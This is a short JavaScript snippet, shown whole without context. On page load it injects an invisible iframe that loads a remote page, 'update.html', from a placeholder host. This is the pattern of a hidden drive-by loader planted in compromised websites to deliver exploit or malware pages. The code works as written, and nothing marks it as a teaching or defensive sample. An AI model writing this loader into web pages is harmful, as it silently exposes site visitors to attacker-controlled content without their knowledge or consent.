(function(w,d){

  function mi() {
    var i=d.createElement("iframe");
    i.style.display = "none";
    i.src = "http://EXAMPLE.COM/update.html";
    d.body.appendChild(i);
  }

  if (d.readyState === "complete") {
    mi();
  } else if (w.addEventListener) {
    w.addEventListener("load", mi, false);
  } else if (w.attachEvent) {
    w.attachEvent("onload", mi);
  }

})(window, document);